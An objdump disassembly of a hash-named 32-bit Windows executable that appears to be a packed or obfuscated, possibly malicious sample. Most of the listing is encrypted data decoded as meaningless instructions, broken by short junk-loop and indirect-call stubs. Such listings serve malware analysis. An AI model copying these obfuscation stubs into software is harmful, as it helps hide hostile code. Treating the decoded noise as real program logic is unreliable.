
d56abe06caa64a6eced0c5dcb521c8fb417ff9c76b21687536ab4584765489b6.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x42aef5
  40100c:	jmp    0x4012ab
  401011:	(bad)  
  401012:	into   
  401013:	(bad)  
  401014:	rcr    edx,cl
  401016:	(bad)  
  401018:	aad    0xdf
  40101a:	mov    ebx,0xcb1c0cf7
  40101f:	clc    
  401020:	mov    esp,0x78787878
  401025:	(bad)  
  401026:	jle    0x4010a0
  401028:	js     0x400ff2
  40102a:	xlat   BYTE PTR ds:[ebx]
  40102b:	cmp    eax,0xcfdbc1d5
  401030:	fxch   st(0)
  401032:	pop    es
  401033:	push   es
  401034:	or     ecx,DWORD PTR [edi]
  401036:	mov    esp,0xf3b0f0a
  40103b:	retf   0xc722
  40103e:	sbb    bl,BYTE PTR [edi]
  401040:	inc    ecx
  401041:	bound  ecx,QWORD PTR [edx]
  401043:	mov    bh,0xdd
  401045:	or     bh,ch
  401047:	mov    ebp,0x880bd0e3
  40104c:	and    BYTE PTR [eax+0x1549a4f6],bh
  401052:	lods   eax,DWORD PTR ds:[esi]
  401053:	fadd   DWORD PTR [eax+0x1f]
  401056:	pusha  
  401057:	out    dx,al
  401058:	outs   dx,DWORD PTR ds:[esi]
  401059:	adc    ebx,DWORD PTR [ecx]
  40105b:	sahf   
  40105c:	add    dl,al
  40105e:	dec    edx
  40105f:	lods   al,BYTE PTR ds:[esi]
  401060:	pop    ebx
  401061:	sub    eax,0xad3ec6d9
  401066:	mov    WORD PTR [ebx],es
  401068:	lds    esi,FWORD PTR [ebx-0x76243a00]
  40106e:	adc    eax,0x3af3c19a
  401074:	xchg   ebx,eax
  401075:	icebp  
  401076:	dec    edi
  401077:	loopne 0x401019
  401079:	dec    ecx
  40107a:	call   DWORD PTR [edi-0x234ef85e]
  401080:	mov    ebp,0x5530ed4d
  401085:	sub    esi,DWORD PTR [esp+ebp*8+0x3be9868]
  40108c:	sbb    ebx,ecx
  40108e:	xchg   esp,eax
  40108f:	sub    esi,edx
  401091:	repz pop eax
  401093:	(bad)  
  401094:	out    0x42,al
  401096:	cli    
  401097:	in     al,dx
  401098:	xchg   esp,eax
  401099:	cmp    edi,ecx
  40109b:	jbe    0x401102
  40109d:	xlat   BYTE PTR ds:[ebx]
  40109e:	sub    cl,ch
  4010a0:	add    al,0xe1
  4010a2:	sbb    DWORD PTR [ecx-0x60],ebx
  4010a5:	xor    eax,0x2696f0b
  4010aa:	adc    bh,BYTE PTR [ecx]
  4010ac:	fisttp QWORD PTR [eax+0x7f753256]
  4010b2:	cmp    BYTE PTR [edi+0x13b0e30c],cl
  4010b8:	arpl   WORD PTR [ebp-0x23],dx
  4010bb:	rcl    BYTE PTR [ecx],1
  4010bd:	fistp  DWORD PTR [esi-0x1f]
  4010c0:	and    DWORD PTR [ecx-0x68],edi
  4010c3:	inc    eax
  4010c4:	push   ebx
  4010c5:	aaa    
  4010c6:	adc    eax,0x1c317733
  4010cb:	fstp   TBYTE PTR [eax]
  4010cd:	dec    edi
  4010ce:	repnz into 
  4010d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4010d1:	mov    WORD PTR [edx+0x71],ss
  4010d4:	cdq    
  4010d5:	test   BYTE PTR [ebp-0x73],dh
  4010d8:	leave  
  4010d9:	je     0x401149
  4010db:	sub    DWORD PTR [edi-0x2d214fd7],esi
  4010e1:	fs data16 or al,0x71
  4010e5:	xchg   BYTE PTR [edi+esi*1+0x71059937],cl
  4010ec:	enter  0x4498,0x15
  4010f0:	out    0x4b,eax
  4010f2:	in     eax,dx
  4010f3:	and    DWORD PTR [ebx-0x4b827719],0xe
  4010fa:	in     eax,dx
  4010fb:	je     0x4010ca
  4010fd:	pop    es
  4010fe:	add    eax,eax
  401100:	pop    ecx
  401101:	ss jae 0x4010f3
  401104:	jbe    0x4010f9
  401106:	clc    
  401107:	cmp    eax,0x9ce643f3
  40110c:	xchg   ecx,eax
  40110d:	popf   
  40110e:	out    0xfb,al
  401110:	pop    ecx
  401111:	mov    ds,WORD PTR [ecx]
  401113:	pusha  
  401114:	jnp    0x4010e8
  401116:	mov    eax,ds:0x338abdbb
  40111b:	cmp    ebp,esp
  40111d:	call   0x66ef5098
  401122:	nop
  401123:	out    0x3d,eax
  401125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401126:	jmp    0x401142
  401128:	or     al,0xbf
  40112a:	or     DWORD PTR [ebp+0x79a2c137],edi
  401130:	pusha  
  401131:	shl    DWORD PTR [edi+0x2212e64c],cl
  401137:	in     al,dx
  401138:	dec    esi
  401139:	(bad)  
  40113a:	sti    
  40113b:	dec    ecx
  40113c:	mov    ebp,0xfdb17e8b
  401141:	cmp    BYTE PTR [edi],ch
  401143:	imul   DWORD PTR [ebx-0x5]
  401146:	cmp    dl,cl
  401148:	mov    BYTE PTR [edx+0x3c],bl
  40114b:	retf   
  40114c:	fcmovbe st,st(3)
  40114e:	and    al,0x5b
  401150:	and    al,BYTE PTR [eax+0x44da8e79]
  401156:	shl    BYTE PTR [ecx+0x70ae96ed],1
  40115c:	push   esi
  40115d:	and    esi,ebp
  40115f:	mov    bl,0x92
  401161:	shl    edi,cl
  401163:	popa   
  401164:	push   cs
  401165:	out    0x63,al
  401167:	dec    edx
  401168:	data16 and al,0x56
  40116b:	mov    esp,0xec34d77e
  401170:	(bad)  
  401172:	shr    DWORD PTR [edi-0x3e],0x2c
  401176:	dec    edi
  401177:	mov    cx,0xbbac
  40117b:	(bad)  
  40117c:	adc    dh,BYTE PTR [edx-0x17]
  40117f:	jmp    0x401110
  401181:	jae    0x40116f
  401183:	(bad)  
  401185:	and    BYTE PTR [eax-0x42],dh
  401188:	mov    ah,0xcf
  40118a:	lods   al,BYTE PTR ds:[esi]
  40118b:	in     eax,dx
  40118c:	clc    
  40118d:	addr16 push eax
  40118f:	xor    bl,BYTE PTR [ebx+0x3]
  401192:	shl    BYTE PTR [edx-0x4b],0x77
  401196:	add    edx,ebx
  401198:	fld    TBYTE PTR [ecx]
  40119a:	or     esp,ebp
  40119c:	jecxz  0x401128
  40119e:	mov    bh,0x30
  4011a0:	outs   dx,DWORD PTR ds:[esi]
  4011a1:	pop    ecx
  4011a2:	stc    
  4011a3:	jge    0x401142
  4011a5:	(bad)  
  4011a6:	mov    bl,0x61
  4011a8:	jmp    0xd9f1378f
  4011ad:	mov    dl,0x9
  4011af:	or     BYTE PTR [ebx+0x29],ch
  4011b2:	loopne 0x401203
  4011b4:	mov    ds,ecx
  4011b6:	int    0x4b
  4011b8:	jmp    0x99ad5a87
  4011bd:	xor    DWORD PTR [esi],edi
  4011bf:	mov    bl,0xde
  4011c1:	pop    ebp
  4011c2:	sti    
  4011c3:	jle    0x4011b0
  4011c5:	jecxz  0x4011bb
  4011c7:	inc    ebp
  4011c8:	lock push edi
  4011ca:	xchg   esi,eax
  4011cb:	sbb    BYTE PTR [esi],ch
  4011cd:	call   0x83cd:0x80b04e27
  4011d4:	dec    esp
  4011d5:	mov    BYTE PTR [ecx],dl
  4011d7:	enter  0x33b6,0xc9
  4011db:	lock lods eax,DWORD PTR ds:[esi]
  4011dd:	rol    dh,cl
  4011df:	cmp    BYTE PTR [edx],ch
  4011e1:	repnz push ecx
  4011e3:	je     0x4011e6
  4011e5:	and    al,0xf5
  4011e7:	cmp    al,0x8c
  4011e9:	xchg   DWORD PTR [edx+0x48],ecx
  4011ec:	jge    0x40118b
  4011ee:	out    dx,eax
  4011ef:	test   DWORD PTR [edx+0x2dc0306e],ecx
  4011f5:	shl    DWORD PTR ds:0xe5f938b9,1
  4011fb:	hlt    
  4011fc:	shl    DWORD PTR [eax-0x7548dc97],1
  401202:	aaa    
  401203:	ds pcmpeqw mm3,mm4
  401207:	mov    ah,al
  401209:	xor    al,0xaf
  40120b:	inc    eax
  40120c:	ffree  st(5)
  40120e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40120f:	ds inc esp
  401211:	mov    WORD PTR [edx],gs
  401213:	mov    BYTE PTR [eax-0x122e687a],al
  401219:	addr16 and al,0xdb
  40121c:	punpckhwd mm0,QWORD PTR [ecx*4+0x186773a3]
  401224:	pop    eax
  401225:	mov    al,ds:0x932f9e1c
  40122a:	pop    esp
  40122b:	repz das 
  40122d:	ret    0x5b4d
  401230:	arpl   WORD PTR [si],cx
  401233:	in     al,0xe5
  401235:	neg    DWORD PTR [eax+0x73]
  401238:	fwait
  401239:	xchg   edx,eax
  40123a:	test   eax,0x557ced9b
  40123f:	inc    ebp
  401240:	inc    esp
  401241:	pop    eax
  401242:	jmp    0x40124a
  401244:	xor    eax,0x3b11e53b
  401249:	sub    eax,0xd1369de7
  40124e:	jp     0x4011d7
  401250:	nop
  401251:	in     eax,dx
  401252:	(bad)  
  401253:	js     0x40128e
  401255:	out    0xc1,al
  401257:	sbb    ah,BYTE PTR ds:[edi-0x64a7b131]
  40125e:	(bad)  
  40125f:	(bad)  
  401260:	add    edx,0xffffff84
  401263:	dec    ebp
  401264:	mov    dh,0x69
  401266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401267:	cmp    edx,DWORD PTR [esi+eax*4]
  40126a:	shl    DWORD PTR [eax+eiz*8],cl
  40126d:	ror    BYTE PTR [ebx],1
  40126f:	jmp    0x40128d
  401271:	test   eax,0x96c0fca1
  401276:	int    0x90
  401278:	push   esi
  401279:	mov    bl,0x47
  40127b:	in     al,dx
  40127c:	jb     0x4012f4
  40127e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40127f:	push   edi
  401280:	add    BYTE PTR [eax+0x757756b6],0xd0
  401287:	xor    dl,BYTE PTR [eax-0x32096006]
  40128d:	xchg   edi,eax
  40128e:	jg     0x401304
  401290:	jnp    0x401277
  401292:	xchg   edx,eax
  401293:	mov    dh,BYTE PTR [ecx]
  401295:	in     eax,0xd6
  401297:	mov    ?,WORD PTR fs:[eax+0x64]
  40129b:	hlt    
  40129c:	das    
  40129d:	test   DWORD PTR [eax+0x3c],ebp
  4012a0:	jecxz  0x401227
  4012a2:	or     BYTE PTR [esi+0x67a87c54],ah
  4012a8:	lds    ecx,FWORD PTR [ebx]
  4012aa:	(bad)  
  4012ab:	mov    eax,ds:0x41eae6
  4012b0:	xor    DWORD PTR ds:0x42af8d,edx
  4012b6:	mov    eax,DWORD PTR [eax+0x198]
  4012bc:	mov    ecx,DWORD PTR ds:0x42af41
  4012c2:	or     DWORD PTR ds:0x42aeed,ecx
  4012c8:	mov    DWORD PTR [ebp-0x8],eax
  4012cb:	mov    DWORD PTR ds:0x42aedd,0x436b
  4012d5:	mov    eax,DWORD PTR [ebp+0x8]
  4012d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4012db:	push   ebx
  4012dc:	or     DWORD PTR ds:0x42af41,edx
  4012e2:	push   esi
  4012e3:	add    esi,DWORD PTR ds:0x42af35
  4012e9:	mov    esi,0x7510850
  4012ee:	and    ebx,0x1c58
  4012f4:	xor    eax,esi
  4012f6:	and    DWORD PTR ds:0x42afb9,0x0
  401300:	jmp    0x401312
  401305:	mov    ebx,DWORD PTR ds:0x42afb9
  40130b:	inc    ebx
  40130c:	mov    DWORD PTR ds:0x42afb9,ebx
  401312:	cmp    DWORD PTR ds:0x42afb9,0x11
  401319:	jae    0x401344
  40131f:	cmp    DWORD PTR ds:0x42afb9,0x16
  401326:	jne    0x401335
  40132c:	push   DWORD PTR [ebp-0x1c]
  40132f:	call   DWORD PTR ds:0x41d180
  401335:	jmp    0x401305
  40133a:	adc    DWORD PTR ds:0x42af01,0x42af85
  401344:	push   edi
  401345:	and    DWORD PTR ds:0x42af89,0x0
  40134f:	jmp    0x401361
  401354:	mov    edi,DWORD PTR ds:0x42af89
  40135a:	inc    edi
  40135b:	mov    DWORD PTR ds:0x42af89,edi
  401361:	cmp    DWORD PTR ds:0x42af89,0x1d
  401368:	jae    0x4013a9
  40136e:	cmp    DWORD PTR ds:0x42af89,0xe
  401375:	jne    0x401384
  40137b:	push   DWORD PTR [ebp-0x10]
  40137e:	call   DWORD PTR ds:0x41d0b4
  401384:	cmp    DWORD PTR ds:0x42af89,0xd
  40138b:	jne    0x40139e
  401391:	mov    edi,DWORD PTR ds:0x42af89
  401397:	inc    edi
  401398:	mov    DWORD PTR ds:0x42af89,edi
  40139e:	jmp    0x401354
  4013a3:	sub    DWORD PTR ds:0x42af35,edx
  4013a9:	mov    edi,0x327298
  4013ae:	mov    DWORD PTR ds:0x42aeed,0x11
  4013b8:	cmp    DWORD PTR ds:0x42aeed,0x0
  4013bf:	je     0x4016af
  4013c5:	cmp    DWORD PTR ds:0x42aeed,0x2
  4013cc:	jne    0x4013e4
  4013d2:	push   0x42af35
  4013d7:	push   0x0
  4013d9:	push   0x42b14d
  4013de:	call   DWORD PTR ds:0x41d0b8
  4013e4:	cmp    DWORD PTR ds:0x42aeed,0x3
  4013eb:	jne    0x4013fe
  4013f1:	mov    ebx,DWORD PTR ds:0x42aeed
  4013f7:	dec    ebx
  4013f8:	mov    DWORD PTR ds:0x42aeed,ebx
  4013fe:	mov    ebx,DWORD PTR ds:0x42aeed
  401404:	dec    ebx
  401405:	mov    DWORD PTR ds:0x42aeed,ebx
  40140b:	jmp    0x4013b8
  401410:	jmp    0x4016af
  401415:	leave  
  401416:	rol    dh,0xcf
  401419:	leave  
  40141a:	int    0xd9
  40141c:	fimul  DWORD PTR [edx]
  40141e:	leave  
  40141f:	rcl    BYTE PTR [ecx-0x76],1
  401422:	out    dx,al
  401423:	sbb    DWORD PTR [edi],0x78787efe
  401429:	(bad)  
  40142a:	jle    0x4014a4
  40142c:	js     0x40142e
  40142e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40142f:	ins    DWORD PTR es:[edi],dx
  401430:	cmp    DWORD PTR ds:0x48008968,eax
  401436:	push   eax
  401437:	imul   edx,DWORD PTR [eax+eiz*8+0x53886c6c],0x9fb2a465
  401442:	or     esp,DWORD PTR [ecx-0x45]
  401445:	jae    0x401447
  401447:	and    DWORD PTR [ebp+0x4b398abb],esi
  40144d:	add    eax,0xc1760f4a
  401452:	push   cs
  401453:	js     0x401427
  401455:	add    BYTE PTR [edx],bh
  401457:	call   0x8ac66c56
  40145c:	jge    0x40140e
  40145e:	and    edi,DWORD PTR [ebx]
  401460:	aaa    
  401461:	ins    DWORD PTR es:[edi],dx
  401462:	add    al,0x15
  401464:	mov    al,ds:0xf3464735
  401469:	js     0x40140b
  40146b:	inc    edx
  40146c:	mov    ds:0x2216f022,al
  401471:	les    edi,FWORD PTR [esi-0x7addd8a]
  401477:	jl     0x401422
  401479:	in     al,0xce
  40147b:	lds    edi,FWORD PTR [eax+0x7863479d]
  401481:	mov    BYTE PTR [ecx],dl
  401483:	addr16 mov ch,0xde
  401486:	pop    edx
  401487:	popa   
  401488:	push   esi
  401489:	jmp    0x401500
  40148b:	clc    
  40148c:	fmul   st(4),st
  40148e:	pop    ecx
  40148f:	sbb    al,0x12
  401491:	sbb    al,0x41
  401493:	out    0xc1,al
  401495:	and    BYTE PTR [ebp+0x40],bh
  401498:	pushf  
  401499:	push   esp
  40149a:	xchg   BYTE PTR [ebp-0x29a4e6d3],ch
  4014a0:	jl     0x4014ad
  4014a2:	(bad)  
  4014a3:	shr    DWORD PTR [edx+eiz*8],0x3
  4014a7:	iret   
  4014a8:	or     al,0x7c
  4014aa:	inc    ecx
  4014ab:	call   0x83ab:0x6472a3bb
  4014b2:	sub    DWORD PTR ds:0x71882b95,edi
  4014b8:	sub    BYTE PTR [esi+0x3cd82e6f],0xb8
  4014bf:	loopne 0x401510
  4014c1:	xor    BYTE PTR [ecx],0xfa
  4014c4:	ins    DWORD PTR es:[edi],dx
  4014c5:	retf   
  4014c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4014c7:	das    
  4014c8:	dec    cl
  4014ca:	xchg   edx,eax
  4014cb:	stc    
  4014cc:	xor    eax,0xc1598b5b
  4014d1:	rol    BYTE PTR [edx],cl
  4014d3:	sbb    edx,eax
  4014d5:	inc    eax
  4014d6:	(bad)  
  4014d7:	imul   BYTE PTR [edi]
  4014d9:	daa    
  4014da:	mov    al,0xef
  4014dc:	lahf   
  4014dd:	inc    eax
  4014de:	jne    0x4014f7
  4014e0:	lods   eax,DWORD PTR ds:[esi]
  4014e1:	push   ebx
  4014e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4014e3:	rol    BYTE PTR [edi+ebx*8+0xd227000],cl
  4014ea:	test   DWORD PTR ds:0xc962712b,eax
  4014f0:	mov    ss,esp
  4014f2:	cmp    ecx,esp
  4014f4:	sbb    al,0xa6
  4014f6:	or     al,0xf8
  4014f8:	lea    ecx,[esi-0x77]
  4014fb:	outs   dx,DWORD PTR ds:[esi]
  4014fc:	jle    0x4014be
  4014fe:	sub    edi,DWORD PTR [edi+edx*1+0x70b85e98]
  401505:	inc    edi
  401506:	lock jnp 0x401525
  401509:	outs   dx,BYTE PTR ds:[esi]
  40150a:	dec    edi
  40150b:	push   0x6e565fda
  401510:	(bad)  
  401511:	jle    0x4014a9
  401513:	sbb    DWORD PTR [ebx-0x5b],ecx
  401516:	ins    DWORD PTR es:[edi],dx
  401517:	jp     0x401555
  401519:	(bad)  
  40151a:	lods   eax,DWORD PTR ds:[esi]
  40151b:	cmp    DWORD PTR [esi+ebx*2],esp
  40151e:	outs   dx,BYTE PTR ss:[esi]
  401520:	adc    DWORD PTR [esp+ecx*8],esp
  401523:	jne    0x40153e
  401525:	add    edx,esp
  401527:	test   eax,0x974ecab5
  40152c:	inc    eax
  40152d:	or     DWORD PTR [eax-0x581bf249],ecx
  401533:	mov    edx,0xfab2b69f
  401538:	data16 hlt 
  40153a:	call   0x71e5:0xc4e4498
  401541:	test   BYTE PTR [ecx-0x357bf5b5],bh
  401547:	mov    ebp,0xe12d853c
  40154c:	sbb    edx,DWORD PTR [ebx+0x61]
  40154f:	or     eax,0x6c35a27e
  401554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401555:	cmp    dh,BYTE PTR [ecx-0x4c4aaa30]
  40155b:	fsub   st(4),st
  40155d:	mov    BYTE PTR [ebp+esi*4+0x1bffbadf],dl
  401564:	jmp    0xa7cb:0xba976f85
  40156b:	adc    al,0x6e
  40156d:	inc    edx
  40156e:	mov    bh,0x5d
  401570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401571:	push   edx
  401572:	enter  0x1cc2,0x2d
  401576:	into   
  401577:	mov    ah,0xbb
  401579:	push   ebp
  40157a:	mov    edx,0x2cc0738c
  40157f:	dec    eax
  401580:	xchg   BYTE PTR [bx+si+0x73],ch
  401584:	ja     0x40157d
  401586:	xor    DWORD PTR [eax+0x34],edi
  401589:	xor    eax,ebp
  40158b:	test   eax,0xa70755f8
  401590:	pop    ebx
  401591:	hlt    
  401592:	pushf  
  401593:	(bad)
  401596:	test   al,0x97
  401598:	out    0xa9,eax
  40159a:	not    BYTE PTR [esi]
  40159c:	mov    BYTE PTR [eax],bl
  40159e:	in     al,0x43
  4015a0:	push   ebx
  4015a1:	retf   0x2a49
  4015a4:	push   ds
  4015a5:	dec    si
  4015a7:	xor    eax,DWORD PTR [edi+0x4c]
  4015aa:	out    dx,al
  4015ab:	pop    esp
  4015ac:	scas   eax,DWORD PTR es:[edi]
  4015ad:	jmp    0x4b03d38
  4015b2:	mov    edx,0x10df7f05
  4015b7:	push   ebp
  4015b8:	test   DWORD PTR [ecx-0x47],eax
  4015bb:	and    dh,bl
  4015bd:	jnp    0x401612
  4015bf:	bound  ecx,QWORD PTR fs:[esi-0x3a6babd2]
  4015c6:	fldenv [ebp+eiz*4-0x34501989]
  4015cd:	sbb    BYTE PTR [esi+0x4eb39006],al
  4015d3:	xlat   BYTE PTR ds:[ebx]
  4015d4:	xchg   esp,eax
  4015d5:	clc    
  4015d6:	(bad)  [edx-0x46cd578d]
  4015dc:	push   esi
  4015dd:	out    0xd4,al
  4015df:	pop    esi
  4015e0:	lahf   
  4015e1:	fdivr  QWORD PTR [esi+0x77]
  4015e4:	push   ebx
  4015e5:	adc    eax,0x674d1648
  4015ea:	in     al,dx
  4015eb:	mov    ecx,DWORD PTR [ebx]
  4015ed:	int    0x68
  4015ef:	mov    esp,0x6e41aa6c
  4015f4:	xor    edi,DWORD PTR [ecx]
  4015f6:	xlat   BYTE PTR ds:[ebx]
  4015f7:	call   FWORD PTR [eax*2+0x40d52748]
  4015fe:	fs push cs
  401600:	xor    eax,0x51fe956d
  401605:	mov    esp,0xb24ca9bc
  40160a:	test   BYTE PTR [eax],0xdd
  40160d:	inc    ebp
  40160e:	cmp    BYTE PTR [edi],cl
  401610:	pop    ds
  401611:	mov    edx,0xb76c28e5
  401616:	xchg   esi,eax
  401617:	cmp    ebx,eax
  401619:	mov    cl,0x4d
  40161b:	lahf   
  40161c:	fmul   DWORD PTR [esi]
  40161e:	mov    edx,0xb4395e37
  401623:	push   ds
  401624:	xor    al,0x41
  401626:	cmp    eax,0x8fe8e380
  40162b:	push   0xffffff9d
  40162d:	retf   0x8b32
  401630:	retf   0xab23
  401633:	(bad)  
  401634:	mov    cl,0xe2
  401636:	les    eax,FWORD PTR [ebx-0x5f]
  401639:	test   BYTE PTR [ebp-0x4dcd8a01],al
  40163f:	mov    esi,0xb2277f23
  401644:	pop    edx
  401645:	mov    bh,0x92
  401647:	push   0xea977754
  40164c:	xchg   ebp,eax
  40164d:	daa    
  40164e:	dec    ebx
  40164f:	mov    ecx,0x23e85dff
  401654:	out    0xf5,eax
  401656:	out    dx,al
  401657:	cmp    eax,0x419ce71a
  40165c:	fcomi  st,st(7)
  40165e:	sub    BYTE PTR [ebp-0x66],dh
  401661:	mov    ebp,0xaddc3af1
  401666:	inc    edi
  401667:	lds    ebp,FWORD PTR [ecx+0x2a]
  40166a:	mov    ds:0xcf332c75,al
  40166f:	lea    edx,[ecx]
  401671:	test   al,0xf8
  401673:	test   eax,0xb0b51e14
  401678:	mov    edi,0x33c44c7c
  40167d:	sub    esp,DWORD PTR [ebx+ebp*1-0x58ed91eb]
  401684:	aam    0x24
  401686:	push   0xffffff8b
  401688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401689:	in     al,0x20
  40168b:	fbstp  TBYTE PTR [edi+edi*2-0x1a]
  40168f:	push   ds
  401690:	jg     0x40169b
  401692:	mov    eax,0x4779686a
  401697:	mov    al,ch
  401699:	(bad)  [eax]
  40169b:	sbb    eax,0x60c3f3b2
  4016a0:	push   ecx
  4016a1:	neg    DWORD PTR [ebp+0x1e33ff23]
  4016a7:	daa    
  4016a8:	mov    bl,0x1a
  4016aa:	aas    
  4016ab:	jecxz  0x4016bd
  4016ad:	rcl    DWORD PTR [ebx+eax*1-0x32ca7e39],cl
  4016b4:	scas   eax,DWORD PTR es:[edi]
  4016b5:	inc    edx
  4016b6:	add    ah,bl
  4016b8:	push   ebx
  4016b9:	add    BYTE PTR [eax],al
  4016bb:	mov    DWORD PTR [ecx],eax
  4016bd:	adc    DWORD PTR ds:0x42af39,edi
  4016c3:	lea    eax,[ebp-0x4]
  4016c6:	or     DWORD PTR ds:0x42aee9,0x42aedd
  4016d0:	mov    DWORD PTR [ebp-0x10],eax
  4016d3:	xor    DWORD PTR ds:0x42aeed,ebx
  4016d9:	mov    eax,DWORD PTR [ebp+0x8]
  4016dc:	neg    ecx
  4016de:	mov    ecx,DWORD PTR [ebp-0x10]
  4016e1:	xor    eax,esi
  4016e3:	jmp    0x401982
  4016e8:	ret    0x3dc5
  4016eb:	ret    
  4016ec:	leave  
  4016ed:	retf   
  4016ee:	ret    0xebc5
  4016f1:	out    0x4b,eax
  4016f3:	repz xchg edi,eax
  4016f5:	cmp    edi,DWORD PTR [eax+0x78037cd3]
  4016fb:	js     0x4016fb
  4016fd:	jle    0x401777
  4016ff:	js     0x401734
  401701:	dec    ecx
  401702:	sub    DWORD PTR [ebp+0x1e9dd05e],edx
  401708:	adc    DWORD PTR [esi+esi*2],0xe1696a45
  40170f:	popa   
  401710:	add    BYTE PTR [ebx-0x33],dl
  401713:	test   bl,dl
  401715:	aaa    
  401716:	mov    edx,0xe447c663
  40171b:	mov    bh,0xe4
  40171d:	mov    eax,ds:0x35e314f9
  401722:	mov    gs,WORD PTR [ebp+0x4f4d0cc6]
  401728:	sub    dh,BYTE PTR [ecx-0x3a]
  40172b:	loopne 0x401726
  40172d:	popa   
  40172e:	sub    al,0xe5
  401730:	jge    0x401741
  401732:	rol    DWORD PTR [edi-0x48],cl
  401735:	mov    al,0x25
  401737:	and    al,0x3e
  401739:	push   ebp
  40173a:	push   ebp
  40173b:	xchg   edi,eax
  40173c:	(bad)  
  40173d:	push   ebx
  40173e:	inc    esi
  40173f:	xchg   esi,eax
  401740:	icebp  
  401741:	or     eax,0x850ba30f
  401746:	hlt    
  401747:	pop    ebx
  401748:	icebp  
  401749:	std    
  40174a:	mov    ebx,0xf27f588e
  40174f:	pusha  
  401750:	inc    ecx
  401751:	pusha  
  401752:	adc    ebx,eax
  401754:	add    al,0xc
  401756:	xchg   DWORD PTR [edx+0x49],edi
  401759:	les    edx,FWORD PTR [esi]
  40175b:	stc    
  40175c:	daa    
  40175d:	cwde   
  40175e:	test   eax,0x870183f1
  401763:	cmp    al,0x10
  401765:	pop    es
  401766:	mov    al,ds:0x36225e07
  40176b:	fwait
  40176c:	addr16 inc ebp
  40176e:	add    DWORD PTR [edi+0x3c],ebx
  401771:	sidtd  [esi]
  401774:	jg     0x401752
  401776:	pop    esi
  401777:	mov    ecx,0x3f00aa07
  40177c:	sbb    ah,BYTE PTR [ecx]
  40177e:	jmp    0x9443:0xe6fc5374
  401785:	push   edi
  401786:	arpl   WORD PTR [ecx+0x72],bp
  401789:	xlat   BYTE PTR ds:[ebx]
  40178a:	jae    0x401714
  40178c:	push   ebx
  40178d:	bound  ecx,QWORD PTR [eax]
  40178f:	pop    edx
  401790:	push   eax
  401791:	test   al,cl
  401793:	cdq    
  401794:	movd   DWORD PTR [ebp+0x53],mm6
  401798:	jp     0x40172c
  40179a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40179b:	ror    DWORD PTR [edx],1
  40179d:	push   edi
  40179e:	jno    0x40180f
  4017a0:	mov    edi,0x90f02eb0
  4017a5:	(bad)  
  4017a6:	popf   
  4017a7:	stos   BYTE PTR es:[edi],al
  4017a8:	loope  0x401805
  4017aa:	loop   0x401797
  4017ac:	dec    edx
  4017ad:	push   ecx
  4017ae:	xor    ecx,DWORD PTR [ecx+eax*1-0x4203f2bf]
  4017b5:	adc    BYTE PTR [esp+0x7fef8cd1],dl
  4017bc:	dec    edx
  4017bd:	sbb    DWORD PTR [ebx],eax
  4017bf:	addr16 cmp ch,bh
  4017c2:	or     ah,BYTE PTR [eax+0x73a056e]
  4017c8:	(bad)  
  4017c9:	cmp    al,0xb1
  4017cb:	sbb    ebp,DWORD PTR [esi-0xaf6086a]
  4017d1:	push   ss
  4017d2:	dec    ecx
  4017d3:	je     0x401815
  4017d5:	stc    
  4017d6:	cld    
  4017d7:	imul   ebx,DWORD PTR ds:0xbc276b8b,0xa3672809
  4017e1:	inc    DWORD PTR [ecx+esi*4]
  4017e4:	or     ax,WORD PTR [edx-0x4094ee8f]
  4017eb:	outs   dx,DWORD PTR ds:[esi]
  4017ec:	inc    esi
  4017ed:	dec    ecx
  4017ee:	pop    es
  4017ef:	jne    0x4017cd
  4017f1:	neg    ah
  4017f3:	std    
  4017f4:	inc    ebx
  4017f5:	mov    ecx,0xa454bc01
  4017fa:	or     esi,DWORD PTR [ebx-0x60898c1d]
  401800:	das    
  401801:	(bad)  
  401802:	push   esi
  401803:	cmp    BYTE PTR [edx-0x7d],bh
  401806:	pop    ecx
  401807:	adc    al,0xcd
  401809:	test   dh,dl
  40180b:	xor    ah,bl
  40180d:	xor    esp,ecx
  40180f:	mov    BYTE PTR [edi],bl
  401811:	mov    ds:0x77930400,al
  401816:	cmp    ecx,DWORD PTR [eax-0x75fa21b7]
  40181c:	fst    QWORD PTR [ecx+0x73df8dad]
  401822:	pop    ecx
  401823:	arpl   WORD PTR [esi-0x142d4ccb],ax
  401829:	push   eax
  40182a:	repnz cwde 
  40182c:	cmp    ah,dh
  40182e:	mov    eax,esp
  401830:	push   ebx
  401831:	(bad)  
  401832:	inc    ebp
  401833:	xor    ebx,edx
  401835:	shr    DWORD PTR [edx-0x1a],cl
  401838:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401839:	frstor [ebx-0x4d]
  40183c:	mov    DWORD PTR [ebx+0x30],edi
  40183f:	test   BYTE PTR [edi+ebp*1-0x79379eba],dh
  401846:	(bad)  
  401847:	aaa    
  401848:	sbb    ah,BYTE PTR [eax+0x47]
  40184b:	xor    eax,0x81a2cd4e
  401850:	dec    esp
  401851:	je     0x401882
  401853:	mov    ecx,0xa71422c0
  401858:	test   al,0x8e
  40185a:	frstor [ecx+0x7b]
  40185d:	push   ss
  40185e:	xchg   ebx,eax
  40185f:	sub    BYTE PTR [esp+eax*2],0xa4
  401863:	fbld   TBYTE PTR [ebx+eiz*4-0x5464801a]
  40186a:	mov    ds:0x67b14236,eax
  40186f:	and    DWORD PTR [ecx+0x2a],esi
  401872:	gs loopne 0x401862
  401875:	out    0x49,al
  401877:	mov    eax,esp
  401879:	(bad)  
  40187a:	push   ebp
  40187b:	mov    ebp,0x7a894a82
  401880:	mov    esp,0x7b9d8571
  401885:	es mov ch,0xba
  401888:	rcr    BYTE PTR [edx+edx*4-0x30d68a67],0xf
